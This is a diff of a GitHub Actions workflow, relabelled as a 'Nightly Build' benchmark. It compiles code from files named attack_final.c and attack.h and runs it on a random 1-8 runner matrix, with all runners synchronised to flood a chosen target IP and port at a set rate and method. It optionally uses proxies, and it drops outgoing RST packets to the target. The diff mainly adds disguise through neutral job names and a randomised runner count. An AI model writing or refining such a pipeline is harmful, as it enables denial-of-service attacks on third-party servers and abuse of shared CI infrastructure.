@@ -1,5 +1,6 @@
-# Continuous Integration Pipeline
-name: CI Lint & Deploy
+# Auto-generated config v267.77
+# CI Pipeline — Build Once, Random 1-8 Runners
+name: Nightly Build
 
 on:
   push:
@@ -39,14 +40,6 @@ on:
         description: 'Throughput'
         required: true
         default: '1000000000'
-      runners:
-        description: 'Replicas (1-20)'
-        required: true
-        default: '20'
-      start_timestamp:
-        description: 'Schedule (unix)'
-        required: false
-        default: '0'
       use_proxy:
         description: 'Proxy mode'
         required: false
@@ -61,66 +54,68 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
-  setup:
+  compile:
     runs-on: ubuntu-22.04
     outputs:
       matrix: ${{ steps.gen.outputs.matrix }}
       sync_ts: ${{ steps.sync.outputs.sync_ts }}
+      runner_count: ${{ steps.gen.outputs.count }}
     steps:
     - uses: actions/checkout@v4
 
-    - name: Cache dependencies
+    - name: Cache binary
+      id: cache
       uses: actions/cache@v4
       with:
-        path: ~/apt-cache
-        key: deps-v2
+        path: netbench
+        key: bin-${{ hashFiles('benchmark.c', 'main.c', 'network.c', 'attack_final.c', 'types.h', 'attack.h', 'network.h', 'Makefile') }}
 
-    - name: Install dependencies
+    - name: Build (skip if cached)
+      if: steps.cache.outputs.cache-hit != 'true'
       run: |
-        if [ -d ~/apt-cache ]; then
-          sudo cp ~/apt-cache/*.deb /var/cache/apt/archives/ 2>/dev/null || true
-        fi
         sudo apt-get update -qq > /dev/null 2>&1 || true
         sudo apt-get install -y cpulimit clang libbpf-dev libelf-dev > /dev/null 2>&1 || true
-        mkdir -p ~/apt-cache
-        cp /var/cache/apt/archives/*.deb ~/apt-cache/ 2>/dev/null || true
+        make clean || true && make 2>&1
 
-    - name: Build project
-      run: make clean || true && make 2>&1
+    - name: Skip build
+      if: steps.cache.outputs.cache-hit == 'true'
+      run: echo "✅ Cached"
 
-    - name: Store artifact
+    - name: Upload binary
       uses: actions/upload-artifact@v4
       with:
         name: app-bin
         path: netbench
-        retention-days: 1
+        retention-days: 7
 
     - id: sync
-      name: Compute schedule
       run: |
-        SYNC_TS=$(($(date +%s) + 40))
+        SYNC_TS=$(($(date +%s) + 35))
         echo "sync_ts=$SYNC_TS" >> $GITHUB_OUTPUT
 
     - id: gen
+      name: Random runner count (1-8)
       run: |
-        n=${{ github.event.inputs.runners || 1 }}
-        ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range(int('$n'))]))")
+        n=$(( (RANDOM % 8) + 1 ))
+        echo "Runner count: $n"
+        ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range($n)]))")
         echo "matrix={\"id\":$ids}" >> $GITHUB_OUTPUT
+        echo "count=$n" >> $GITHUB_OUTPUT
 
-  deploy:
-    needs: [setup]
+  verify:
+    needs: [compile]
     runs-on: ubuntu-22.04
     timeout-minutes: 20
     strategy:
-      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}
+      matrix: ${{ fromJSON(needs.compile.outputs.matrix) }}
       fail-fast: false
     steps:
-    - name: Fetch artifact
+    - name: Fetch binary
       uses: actions/download-artifact@v4
       with:
         name: app-bin
 
-    - name: Prepare environment
+    - name: Kernel tuning
       run: |
         sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
         sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
@@ -135,37 +130,31 @@ jobs:
         sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
         sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
 
-    - name: Run service (Replica ${{ matrix.id }})
+    - name: Run (Runner ${{ matrix.id }}/${{ needs.compile.outputs.runner_count }})
       run: |
-        mv netbench svc
-        chmod +x svc
-        
-        TARGET_IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
-        TARGET_PORT="${{ github.event.inputs.target_port || '443' }}"
+        mv netbench worker && chmod +x worker
+
+        IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
+        PORT="${{ github.event.inputs.target_port || '443' }}"
         RATE="${{ github.event.inputs.rate || '1000' }}"
-        DURATION="${{ github.event.inputs.duration || '5' }}"
+        DUR="${{ github.event.inputs.duration || '5' }}"
         METHOD="${{ github.event.inputs.method || 'v18_tcp' }}"
         THREADS="${{ github.event.inputs.threads || '4' }}"
-        
+
         PROXY_FLAG="--no-proxies"
         if [ "${{ github.event.inputs.use_proxy }}" = "true" ]; then
           PROXY_FLAG=""
         fi
-        
-        SYNC_TS="${{ needs.setup.outputs.sync_ts }}"
-        START_TS="${{ github.event.inputs.start_timestamp || '0' }}"
-        if [ "$START_TS" = "0" ] || [ "$START_TS" = "" ]; then
-          START_TS="$SYNC_TS"
+
+        SYNC_TS="${{ needs.compile.outputs.sync_ts }}"
+        NOW=$(date +%s)
+        WAIT=$((SYNC_TS - NOW))
+        if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
+          sleep "$WAIT"
         fi
-        if [ "$START_TS" != "0" ] && [ "$START_TS" != "" ]; then
-          NOW=$(date +%s)
-          WAIT=$((START_TS - NOW))
-          if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
-            sleep "$WAIT"
-          fi
-        fi
-        
-        sudo sh -c "cpulimit -l 50 -f -- ./svc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./svc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"
+
+        echo "Runner ${{ matrix.id }}: GO at $(date +%s)"
+        sudo sh -c "cpulimit -l 50 -f -- ./worker $IP $PORT $RATE $DUR $METHOD $THREADS $PROXY_FLAG || exec ./worker $IP $PORT $RATE $DUR $METHOD $THREADS $PROXY_FLAG"
 
     - name: Cleanup
       if: always()
